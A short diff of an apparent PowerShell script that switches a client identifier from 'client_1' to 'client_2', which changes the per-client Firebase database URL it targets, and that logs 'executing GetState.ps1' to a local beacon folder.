@@ -1,4 +1,4 @@
-$client = "client_1"
+$client = "client_2"
 $url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/$client/state.json"
 echo "executing GetState.ps1" > C:\temp\beacon\log2.txt
 
